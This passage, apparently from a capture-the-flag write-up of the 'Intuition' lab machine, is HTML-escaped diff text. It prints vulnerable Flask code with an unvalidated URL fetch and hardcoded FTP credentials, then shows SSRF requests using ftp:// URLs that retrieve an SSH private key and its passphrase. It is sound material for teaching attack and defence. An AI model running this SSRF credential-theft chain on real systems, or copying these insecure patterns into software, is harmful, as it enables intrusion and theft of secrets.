+            &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;# Fetch the report content
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;request_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data=...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;html_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+                &lt;span class=&quot;c1&quot;&gt;# Generate the PDF
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;pdf_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdf_report_path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/report_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.pdf&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pdfkit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdf_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdf_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as_attachment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Invalid URL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Unexpected error!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard/create_pdf_report.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard/create_pdf_report.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/backup&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Create a backup of the application and upload it to an FTP server.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;source_directory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;../../../&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;current_datetime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%Y%m%d%H%M%S&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;backup_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;app_backup_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_datetime&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.zip&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Create a ZIP backup
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backup_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZIP_DEFLATED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;walk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;arcname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;relpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;zipf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arcname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arcname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# Upload backup to FTP server
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ftp.local&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ftp_admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;u3jai8y71s2&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backup_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;rb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;storbinary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;STOR &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backup_filename&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backup_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Backup and upload completed successfully!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard.dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;ftp-backup&quot;&gt;FTP Backup:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard.py&lt;/code&gt; script there appears to be a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP backup&lt;/code&gt; method put into place that is backing up the application.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; They stored the login directly in the app.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; user: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp_admin&lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt; password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u3jai8y71s2&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We can abuse our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt; vulnerability and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSRF&lt;/code&gt; to try to connect to the FTP server locally and receive the information back in the PDF.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Set your Exploit in your request to &lt;mark&gt;`ftp://ftp_admin:u3jai8y71s2@ftp.local`&lt;/mark&gt;. This will connect locally and the response will be sent back in the pdf.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_FTP_Connect.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Awesome. It worked. We see that housed in the ftp server is a couple of interesting files.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw------- 1 root root  2,655 Sep 06 14:50 private-8297.key
+-rw-r--r-- 1 root root 15,519 Sep 06 14:50 welcome_note.pdf
+-rw-r--r-- 1 root root  1,732 Sep 06 14:50 welcome_note.txt
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You guessed what happens next! Lets try to access these files.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.pdf&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Welcome Text:&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+Dear Devs,
+
+We are thrilled to extend a warm welcome to you as you embark on this exciting journey with us. Your arrival marks the beginning of an inspiring chapter in our collective pursuit of excellence, and we are genuinely delighted to have you on board.
+
+Here, we value talent, innovation, and teamwork, and your presence here reaffirms our commitment to nurturing a diverse and dynamic workforce. Your skills, experience, and unique perspectives are invaluable assets that will contribute significantly to our continued growth and success.
+
+As you settle into your new role, please know that you have our unwavering support. Our team is here to guide and assist you every step of the way, ensuring that you have the resources and knowledge necessary to thrive in your position.
+
+To facilitate your work and access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to access it: `Y27SH19HDIWD`. Please ensure the utmost confidentiality and security when using this key.
+
+If you have any questions or require assistance with server access or any other aspect of your work, please do not hesitate to reach out. In addition to your technical skills, we encourage you to bring your passion, creativity, and innovative thinking to the table. Your contributions will play a vital role in shaping the future of our projects and products.
+
+Once again, welcome to your new family. We look forward to getting to know you, collaborating with you, and witnessing your exceptional contributions. Together, we will continue to achieve great things.
+
+If you have any questions or need further information, please feel free to contact me at adam@comprezzor.htb.
+
+Best regards,
+
+Adam
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;The welcome text contained a access password to go along with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH Private Key&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling&quot; style=&quot;color: #98971a;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Y27SH19HDIWD&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Encrypted Private Key:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
